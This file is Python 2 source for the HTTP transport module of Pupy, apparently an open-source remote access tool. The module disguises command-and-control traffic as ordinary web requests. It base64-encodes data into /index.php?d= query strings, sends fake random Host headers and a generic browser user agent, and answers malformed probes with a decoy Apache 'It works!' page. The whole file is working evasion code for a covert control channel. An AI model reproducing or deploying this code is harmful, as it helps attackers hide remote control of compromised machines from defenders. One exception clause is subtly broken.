# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

""" This module contains an implementation of the 'http' transport for pupy. """

from ..base import BasePupyTransport
import base64, random, string, logging
from collections import OrderedDict
import traceback
import threading
from .utils import *

class InvalidHTTPReq(Exception):
    pass

class MalformedData(Exception):
    pass




error_response_body="""<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>"""
error_response="HTTP/1.1 200 OK\r\n"
error_response+="Server: Apache\r\n"
error_response+="Content-Type: text/html; charset=utf-8\r\n"
error_response+="Content-Length: %s\r\n"%len(error_response_body)
error_response+="\r\n"
error_response+=error_response_body

class PupyHTTPTransport(BasePupyTransport):
    """
    Implements the http protocol transport for pupy.
    """
    pass

class PupyHTTPClient(PupyHTTPTransport):
    client=True
    method="GET"
    keep_alive=True
    path="/index.php?d="
    user_agent="Mozilla/5.0"
    host=None # None for random
    def __init__(self, *args, **kwargs):
        PupyHTTPTransport.__init__(self, *args, **kwargs)
        self.headers={"User-Agent" : self.user_agent}
        if self.host is not None:
            self.headers["Host"]=self.host
        if not "Host" in self.headers:
            self.headers["Host"]="www."+''.join(random.choice(string.ascii_lowercase) for _ in range(0, random.randint(7,10)))+".com"

    def upstream_recv(self, data):
        """
            raw data to HTTP request
        """
        try:
            d=data.peek()

            request="%s %s%s HTTP/1.1\r\n"%(self.method, self.path, base64.b64encode(d))
            for name, value in self.headers.iteritems():
                request+="%s: %s\r\n"%(name, value)
            if self.keep_alive:
                request+="Connection: keep-alive\r\n"
            request+="\r\n"

            data.drain(len(d))
            self.downstream.write(request)
        except Exception as e:
            logging.debug(e)

    def downstream_recv(self, data):
        """
            HTTP response to raw data
        """ 
        d=data.peek()
        decoded_data=b""
        #let's parse HTTP responses :
        while len(d)>0:
            if d.startswith("HTTP/1.1 ") and "\r\n\r\n" in d:
                try:
                    head, rest=d.split("\r\n\r\n", 1)
                    fl, rheaders=head.split("\r\n",1)
                    content_length=None
                    for name, value in [[i.strip() for i in x.split(":",1)] for x in rheaders.split("\r\n")]:
                        if name=="Content-Length":
                            content_length=int(value)
                            break
                    if content_length is None:
                        logging.debug("dafuk ? content-length is None")
                        self.close()
                        return
                    elif len(rest)<content_length:
                        break
                    decoded_data+=base64.b64decode(rest[:content_length])
                    length_to_drain=content_length+4+len(head)
                    data.drain(length_to_drain)
                    d=d[length_to_drain:]
                except Exception as e:
                    logging.debug(e)
                    break
        if decoded_data:
            self.upstream.write(decoded_data)
            

class PupyHTTPServer(PupyHTTPTransport):
    client=False
    response_code="200 OK" 
    server_header="Apache"
    path="/index.php?d="
    verify_user_agent=None # set to the user agent to verify or None not to verify


    def __init__(self, *args, **kwargs):
        PupyHTTPTransport.__init__(self, *args, **kwargs)
        self.headers={
            "Content-Type" : "text/html; charset=utf-8",
            "Server" : self.server_header,
            }

    def upstream_recv(self, data):
        """
            raw data to HTTP response
        """
        try:
            if self.closed:
                return
            d=data.peek()
            encoded_data=base64.b64encode(d)
            response="HTTP/1.1 %s\r\n"%self.response_code
            for name, value in self.headers.iteritems():
                response+="%s: %s\r\n"%(name, value)
            response+="Content-Length: %s\r\n"%len(encoded_data)
            response+="\r\n"
            response+=encoded_data
            self.downstream.write(response)
            data.drain(len(d))
        except Exception as e:
            logging.debug(e)

    def http_req2data(self, s):
        if not s.startswith(("GET ", "POST ", "HEAD ", "PUT ")):
            raise InvalidHTTPReq()
        first_line, headers=s.split("\r\n",1)
        if self.verify_user_agent is not None:
            found_ua=False
            try:
                for name, value in [[i.strip() for i in x.split(":",1)] for x in headers.split("\r\n")]:
                    if name.lower()=="user-agent":
                        if value.strip()==self.verify_user_agent.strip():
                            found_ua=True
            except:
                raise MalformedData("invalid user agent")
            if not found_ua:
                raise MalformedData("invalid user agent")
        if not first_line.endswith(" HTTP/1.1"):
            raise InvalidHTTPReq()
        method, path, http_ver=first_line.split()
        try:
            decoded_data=base64.b64decode(path[len(self.path):])
        except:
            raise MalformedData("can't decode b64")

        return decoded_data

    def downstream_recv(self, data):
        """
            HTTP requests to raw data
        """
        try:
            d=data.peek()
            decoded_data=b""
            tab=d.split("\r\n\r\n")
            if not d.endswith("\r\n\r\n"):
                tab=tab[:-1] #last part is not complete yet
            for req in tab:
                try:
                    if req:
                        newdata = self.http_req2data(req)
                        decoded_data+=newdata
                        data.drain(len(req)+4)
                except MalformedData, InvalidHTTPReq:
                    logging.debug("invalid/malformed data, answering 404 and closing connection")
                    self.downstream.write(error_response)
                    self.close()
                    return
                except Exception as e:
                    break
            self.upstream.write(decoded_data)
        except Exception as e:
            logging.debug(e)
